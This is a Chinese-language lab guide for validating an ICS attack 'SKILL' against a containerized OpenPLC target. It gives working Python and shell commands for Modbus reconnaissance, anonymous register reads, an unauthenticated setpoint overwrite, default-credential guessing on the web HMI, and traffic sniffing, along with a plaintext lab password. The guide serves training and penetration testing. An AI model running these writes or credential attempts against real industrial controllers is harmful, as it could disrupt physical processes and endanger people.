# ics-fieldbus-attack SKILL 验证指南（详细可执行版）

> **目的**：让安全研究员、渗透测试工程师、培训学员能根据本指南，**完整复现** `ics-fieldbus-attack` SKILL 在真实 OpenPLC 上发现漏洞的能力。
>
> **预期耗时**：首次约 30 分钟（环境搭建）+ 60 秒（攻击执行）；后续复现仅 60 秒
>
> **预期结果**：6 个真实漏洞全部演示成功（含 1 个 CVSS 10.0 动力学影响）

---

## 一、读者与前置条件

### 适用读者

- 渗透测试工程师：验证 SKILL 在真实 ICS 软件上有效
- 安全研究员：复现漏洞，延伸研究
- 培训学员：动手学习 ICS 攻击流程
- kali-claw 维护者：SKILL 内容审校

### 前置条件

| 类别 | 要求 |
|------|------|
| 操作系统 | macOS（推荐）/ Linux（需 docker + docker-compose v2） |
| 软件 | colima、docker（含 compose v2 插件）、git-lfs、Kali Linux VM 或同等攻击环境 |
| 磁盘 | ~2 GB（Docker 镜像） |
| 网络 | 可访问 github.com（主机）+ daocloud docker mirror 或同等 |
| 知识 | Modbus TCP 基础、Python 基础、Linux 命令行 |

---

## 二、环境架构

```
┌─────────────────────────────┐         ┌─────────────────────────────┐
│ macOS 主机 / Linux 主机     │         │ Kali Linux VM（攻击机）     │
│                             │         │                             │
│  ┌───────────────────────┐  │         │  - nmap 7.98                │
│  │ grfics-plc 容器       │  │         │  - python3 + pyModbusTCP    │
│  │  ┌─────────────────┐  │  │         │  - curl / tcpdump           │
│  │  │ OpenPLC runtime │←─┼──┼─────────┼→ 6 个攻击执行               │
│  │  │  - 502 Modbus   │  │  │         │                             │
│  │  │  - 8080 Web HMI │  │  │         │                             │
│  │  └─────────────────┘  │  │         │                             │
│  └───────────────────────┘  │         │                             │
│      ↓                     │         │                             │
│   10.211.55.2:502/8080     │         │   10.211.55.5               │
└─────────────────────────────┘         └─────────────────────────────┘
```

**关键设计**：
- GRFICSv3 OpenPLC 容器跑在主机上（Docker 隔离）
- Kali VM 通过 Parallels 共享网络访问主机的 `10.211.55.2:502` 与 `:8080`
- 所有攻击命令在 Kali VM 中执行

---

## 三、环境搭建（一次性，~30 分钟）

### 步骤 1：安装依赖

```bash
# macOS（Homebrew）
brew install colima docker-compose git-lfs

# 启动 colima
colima start
```

**通过条件**：`docker info` 返回有效输出（Server Version 已启动）。

### 步骤 2：配置 Docker registry mirror

由于国内网络无法直连 `registry-1.docker.io`，需配置镜像：

```bash
colima ssh -- sudo tee /etc/docker/daemon.json <<'EOF'
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://docker.1ms.run"
  ]
}
EOF
colima ssh -- sudo systemctl restart docker

# 验证 mirror 生效
docker info | grep -A 3 "Registry Mirrors"
```

**通过条件**：输出含 `https://docker.m.daocloud.io/`。

### 步骤 3：克隆 GRFICSv3 源码（含 LFS）

```bash
cd /tmp
git clone https://github.com/Fortiphyd/GRFICSv3.git
cd GRFICSv3
git lfs pull

# 验证 LFS 文件就位
git lfs ls-files | head -5
# 预期输出（4 个 .unityweb 文件，每个数十 MB）
```

**通过条件**：`git lfs ls-files` 输出至少 4 行，simulation 目录 ~200 MB。

### 步骤 4：构建 OpenPLC 镜像（仅 plc + simulation + router）

```bash
cd /tmp/GRFICSv3

# 初始化 git（build.sh 需要 git describe 取版本号）
git init -q && git add -A && git commit -q -m init && git tag v3.0.0

export BUILD_VERSION=v3.0.0-local
export BUILD_CREATED="2026-08-10T00:00:00Z"

# 构建 3 个必需镜像（其他 5 个不需要：attacker/caldera/wazuh/ews/hmi）
DOCKER_BUILDKIT=1 docker compose build plc simulation router
```

**通过条件**：
```bash
docker images | grep fortiphyd/grfics
# 应输出 3 行：plc / router / simulation
```

### 步骤 5：启动 OpenPLC 容器

```bash
docker run -d --name grfics-plc \
  --cap-add=NET_ADMIN \
  -p 8080:8080 \
  -p 502:502 \
  fortiphyd/grfics-plc:latest

# 等待 5 秒让 OpenPLC ST runtime 启动
sleep 5

# 检查容器状态
docker ps | grep grfics-plc
docker logs grfics-plc 2>&1 | tail -10
# 预期输出："Serving Flask app 'webserver'" + ST 程序编译日志
```

**通过条件**：
- `docker ps` 显示 `grfics-plc` 状态 `Up`
- 日志含 `Serving Flask app 'webserver'` 和 `Running on http://0.0.0.0:8080`
- 端口 502 + 8080 都暴露

### 步骤 6：验证 Kali VM 能访问主机 OpenPLC

```bash
sshpass -p secmind.cn ssh parallels@10.211.55.5 <<'EOF'
echo "--- Web HMI 测试 ---"
curl -sI --max-time 5 http://10.211.55.2:8080/ | head -2

echo "--- Modbus TCP 端口测试 ---"
nc -z -v -w 3 10.211.55.2 502
EOF
```

**通过条件**：
- HTTP/1.1 302 FOUND（OpenPLC Web HMI 重定向到 login）
- `10.211.55.2 502 (?) open`

如失败，检查 Parallels 网络模式（应为 Shared Networking，主机 IP 应为 `10.211.55.2`）。

---

## 四、攻击执行（6 个 SKILL payloads，约 60 秒）

**所有攻击命令在 Kali VM 中执行**：`sshpass -p secmind.cn ssh parallels@10.211.55.5`

### 攻击 1：多协议侦察（SKILL payloads.md line 368）

**目的**：识别目标开放的服务与版本指纹。

```bash
nmap -p 502,8080,20000,2404,4001 -sV 10.211.55.2
```

**预期输出**：
```
PORT      STATE    SERVICE VERSION
502/tcp   open     modbus  Modbus TCP
2404/tcp  filtered iec-104
4001/tcp  filtered newoak
8080/tcp  open     http    Werkzeug httpd 2.3.7 (Python 3.9.2)
20000/tcp filtered dnp
MAC Address: 86:2F:57:C5:09:64 (Unknown)
```

**判定**：✅ 通过条件
- 502/tcp `open modbus`
- 8080/tcp `open http` 且识别出 Werkzeug 版本
- 2404/4001/20000 显示 `filtered`（其他 ICS 协议未运行）

**演示漏洞**：信息泄漏（V7：nmap -sV 直接披露 Werkzeug + Python 版本，可作为后续攻击的指纹）

---

### 攻击 2：Modbus 设备发现（SKILL payloads.md line 40）

**目的**：尝试 Modbus 标准设备识别（FC 0x2B）。

```bash
nmap --script modbus-discover -p 502 10.211.55.2
```

**预期输出**：
```
PORT    STATE SERVICE
502/tcp open  modbus
| modbus-discover:
|   sid 0x1:
|_    error: ILLEGAL FUNCTION
```

**判定**：⚠️ **此结果反映真实生产 PLC 行为**
- OpenPLC（以及许多真实 PLC，如施耐德、ABB）拒绝 FC 0x2B
- 返回 `ILLEGAL FUNCTION` 是预期的
- 这本身是有用的指纹：目标实现了 Modbus 协议但拒绝某些功能码

**SKILL gap 提示**：SKILL 的 `nmap modbus-discover` 暗示返回设备信息；实际很多 PLC 拒绝。已在 SKILL finding F-009 记录。

---

### 攻击 3：匿名寄存器枚举（SKILL §16 模式）

**目的**：验证 Modbus TCP 无认证（V1）+ 数据泄漏（V3）+ 内存泄漏（V5）。

```bash
python3 <<'PYCLIENT'
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='10.211.55.2', port=502, timeout=5)
if c.open():
    print("[+] Connected (no auth required)")
    hr = c.read_holding_registers(0, 50)
    ir = c.read_input_registers(0, 16)
    co = c.read_coils(0, 16)
    print(f"[+] HR[0..49]: {hr}")
    print(f"[+] IR[0..15]: {ir}")
    print(f"[+] Coils[0..15]: {co}")
    non_zero = [(i, v) for i, v in enumerate(hr) if v != 0]
    print(f"[+] Non-zero HR positions: {non_zero}")
    c.close()
else:
    print("[-] Connection failed")
PYCLIENT
```

**预期输出**（关键部分）：
```
[+] Connected (no auth required)
[+] HR[0..49]: [0, 0, ..., 0, 65535, 65535, 0, ...]
[+] Non-zero HR positions: [(12, 65535), (13, 65535)]
```

**判定**：✅ 通过条件
- `Connected (no auth required)` — 验证 V1
- 成功读取 HR/IR/Coils — 验证 V3（匿名数据泄漏）
- HR[12] 或 HR[13] = 65535（0xFFFF）— 验证 V5（内存泄漏：OpenPLC ST 程序中未初始化的变量 `purge_manual_sp` / `product_manual_sp`）

**演示漏洞**：V1 + V3 + V5（一击三中）

---

### 攻击 4：远程设定值覆盖（动力学影响）（SKILL Practical Steps）

**目的**：演示无认证远程写入 → 物理工艺影响（V2，CVSS 10.0）。

```bash
python3 <<'PYCLIENT'
from pyModbusTCP.client import ModbusClient
import time
c = ModbusClient(host='10.211.55.2', port=502, timeout=5)
if c.open():
    print("[*] Reading HR 0-2 BEFORE attack:")
    print(f"    {c.read_holding_registers(0, 3)}")
    print("[*] ATTACK: writing HR 0 = 1000 (setpoint override)")
    ok = c.write_single_register(0, 1000)
    print(f"    Write result: {ok}")
    time.sleep(0.5)
    print("[*] Reading HR 0-2 AFTER attack:")
    print(f"    {c.read_holding_registers(0, 3)} ← value changed")
    c.close()
PYCLIENT
```

**预期输出**：
```
[*] Reading HR 0-2 BEFORE attack:
    [0, 0, 0]
[*] ATTACK: writing HR 0 = 1000 (setpoint override)
    Write result: True
[*] Reading HR 0-2 AFTER attack:
    [1000, 0, 0] ← value changed
```

**判定**：✅✅ **关键验证** — CVSS 10.0
- `Write result: True`
- 攻击后 HR[0] 从 0 变成 1000
- 在真实化工厂中，这意味着远程匿名修改工艺设定值，可造成物理损坏

**演示漏洞**：V2（最严重的漏洞——动力学影响）

---

### 攻击 5：默认凭据尝试（新发现）

**目的**：演示 OpenPLC Web HMI 默认凭据（V8，CVSS 9.8）。

```bash
# 测试多个常见凭据组合
for cred in "admin:admin" "admin:openplc" "openplc:openplc" "admin:password"; do
  user="${cred%:*}"
  pass="${cred#*:}"
  result=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" \
    --max-time 3 \
    -X POST http://10.211.55.2:8080/login \
    -d "username=$user&password=$pass")
  echo "  $user/$pass: $result"
done
```

**预期输出**：
```
admin/admin: 200 
admin/openplc: 200 
openplc:openplc: 302 http://10.211.55.2:8080/dashboard
admin/password: 200 
```

**判定**：✅✅ **新发现** — CVSS 9.8
- `openplc:openplc` 返回 `302 → /dashboard`
- 其他凭据返回 200（停留在 login 页面，失败）
- 这是 OpenPLC 的**真实默认凭据**，提供 Web HMI 完全访问

**演示漏洞**：V8（默认凭据）— SKILL 应在下次 minor 补充

---

### 攻击 6：被动 Modbus 流量捕获

**目的**：演示 Modbus 协议无加密（V4），被动嗅探可获取完整通信。

```bash
# 启动 tcpdump 后台抓包
sudo tcpdump -i any -c 8 -nn 'host 10.211.55.2 and tcp port 502' -w /tmp/cap.pcap 2>&1 &
TCPDUMP_PID=$!
sleep 1

# 触发 Modbus 通信
python3 -c "
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='10.211.55.2', port=502, timeout=2)
c.open()
c.read_holding_registers(0, 5)
c.close()
"

# 等待抓包完成
sleep 2
sudo kill $TCPDUMP_PID 2>/dev/null
wait $TCPDUMP_PID 2>/dev/null

# 显示抓到的包
sudo tcpdump -r /tmp/cap.pcap -nn | head -10
```

**预期输出**（至少 8 个包）：
```
13:16:21.771010 eth0 Out IP 10.211.55.5.47878 > 10.211.55.2.502: Flags [S], ...
13:16:21.771479 eth0 In  IP 10.211.55.2.502 > 10.211.55.5.47878: Flags [S.], ...
13:16:21.771497 eth0 Out IP 10.211.55.5.47878 > 10.211.55.2.502: Flags [.], ack 1, ...
13:16:21.771539 eth0 Out IP 10.211.55.5.47878 > 10.211.55.2.502: Flags [P.], length 12  ← Modbus 请求
13:16:21.827086 eth0 In  IP 10.211.55.2.502 > 10.211.55.5.47878: Flags [P.], length 19  ← Modbus 响应
```

**判定**：✅ 通过条件
- 至少 8 个包被抓
- 至少 1 个 length 12（Modbus MBAP 请求）+ 1 个 length 19（响应）
- 内容完全明文，无 TLS 加密

**演示漏洞**：V4（协议无加密）

---

## 五、漏洞核对表

完成 6 个攻击后，用下表确认每个漏洞是否验证：

| ID | 漏洞 | CVSS | 验证攻击 | 通过条件 |
|----|------|------|---------|---------|
| V1 | Modbus TCP 无认证 | 9.1 严重 | 攻击 3 | "Connected (no auth required)" |
| V2 | 远程设定值覆盖（动力学） | **10.0 严重** | 攻击 4 | HR[0] 从 0 变成 1000 |
| V3 | 匿名数据泄漏 | 7.5 高 | 攻击 3 | HR/IR/Coils 都成功读取 |
| V4 | 无加密（被动捕获） | 7.5 高 | 攻击 6 | tcpdump 抓到 Modbus 明文包 |
| V5 | 内存泄漏（HR 12-13） | 5.3 中 | 攻击 3 | HR[12] 或 HR[13] = 65535 |
| V7 | 信息泄漏（Werkzeug 版本） | 5.3 中 | 攻击 1 | nmap 输出 `Werkzeug httpd 2.3.7 (Python 3.9.2)` |
| V8 | 默认凭据 `openplc:openplc` | **9.8 严重** | 攻击 5 | HTTP 302 → /dashboard |

**SKILL 验证成功条件**：6 个攻击全部执行 + 至少 V1/V2/V3/V4/V8 全部通过 → **SKILL 在真实 OpenPLC 上验证有效**。

---

## 六、问题排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `failed to resolve reference "docker.io/library/..."` | Docker Hub 不可达 | 执行步骤 2 配置 registry mirror |
| `git lfs pointer files detected` | LFS 文件未拉取 | 步骤 3 后执行 `git lfs pull` |
| `simulation build failed` | LFS 文件缺失 | 同上 |
| nmap 返回 ILLEGAL FUNCTION | OpenPLC 实际行为 | 这是预期；不算失败（见攻击 2 说明） |
| tcpdump: permission denied | VM 用户权限不足 | 加 `sudo`（VM 密码：`secmind.cn`） |
| `Connection refused 10.211.55.2:502` | 主机端口未转发 | 检查 `docker ps` 确认 `-p 502:502` |
| HTTP 200 而非 302（凭据） | 默认凭据被改 | 部署时未改默认；如已改，需找其他入口 |
| Werkzeug 版本不同 | OpenPLC 版本差异 | 不影响 V1-V5 + V8 验证 |

---

## 七、清理

```bash
# 停止并删除容器
docker stop grfics-plc
docker rm grfics-plc

# 可选：保留镜像（下次复用）
docker images | grep fortiphyd/grfics

# 完全清理（含镜像）
docker rmi fortiphyd/grfics-{plc,simulation,router}
```

---

## 八、延伸

### 8.1 引用本 SKILL 的章节

- `skills/ics-fieldbus-attack/SKILL.md` — 主 SKILL（含 Defense Triple）
- `skills/ics-fieldbus-attack/payloads.md` — 13 个协议的攻击 payload（攻击 1/2/3 引用其中 line 368、line 40、§16）
- `skills/ics-fieldbus-attack/test-cases.md` — 结构化测试用例
- `skills/ics-fieldbus-attack/guides/usage-and-assessment-zh.md` — SKILL 能力评估（中文）

### 8.2 相关 CVE

- **CVE-2021-31630** — OpenPLC runtime Modbus 异常报文 DoS（攻击 6 抓到的协议，本指南不触发）
- **CVE-2023-31439** — OpenPLC Web HMI 认证绕过（如该版本受影响，可扩展攻击 5）
- **CVE-2021-31631** — OpenPLC ethernet_bruteforce（默认凭据问题）

### 8.3 相关标准

- **MITRE ATT&CK for ICS**：T0817（PLC Software）、T0858（Change Operating Mode）、T0889（Modify Program）、T0890（Mitigation of DLP）
- **IEC 62443**：区域/通道模型；本靶场模拟"Level 2 Control Zone"
- **NIST SP 800-82 Rev 3**：ICS 安全指南

### 8.4 真实世界对应

- **2010 Stuxnet**：通过 Modbus/PROFINET 改变 PLC 设定值（类比攻击 4）
- **2015 Ukraine BlackEnergy**：通过 HMI 默认凭据进入 SCADA（类比攻击 5）
- **2017 Triton**：修改 SIS 安全仪表系统逻辑（类比攻击 4 升级版）

---

## 九、贡献反馈

- 发现新的 OpenPLC 漏洞？记入 `evidence/<日期>/` 目录
- SKILL 内容有错？提 GitHub Issue 或 PR
- 复现失败？先看"问题排查"，再提 Issue

---

## 十、附录：SKILL 在本验证中的表现

### 10.1 评分提升建议

SKILL 在 Pilot 静态评估中的 D3（命令语法）评分为 3/5（基于 Kali VM 默认缺工具）。
本实战验证后，**D3 应修订为 4/5**（命令模式在真实攻击中如文档所述工作）。

### 10.2 新发现的 SKILL 改进点

| ID | 优先级 | 描述 |
|----|-------|------|
| F-008 | **P0** | SKILL 缺 `openplc:openplc` 默认凭据（实证发现的真实默认） |
| F-009 | P1 | SKILL `nmap modbus-discover` 暗示返回设备信息；实际 OpenPLC 返回 ILLEGAL FUNCTION |
| F-010 | P2 | HR 12-13 0xFFFF 内存泄漏模式未在 payloads |
| F-011 | P3 | nmap -sV 泄漏 Werkzeug + Python 版本指纹未明确 |

**这些 findings 应在下次 minor 版本（v0.3.x）补充到 payloads.md**。

---

**文档版本**：1.0（2026-08-10）
**SKILL 验证版本**：v0.2.0.2
**靶场版本**：GRFICSv3 @ commit 92221f4cf6（2026-08-08）
**复现总耗时**：首次 ~30 分钟；后续 ~60 秒
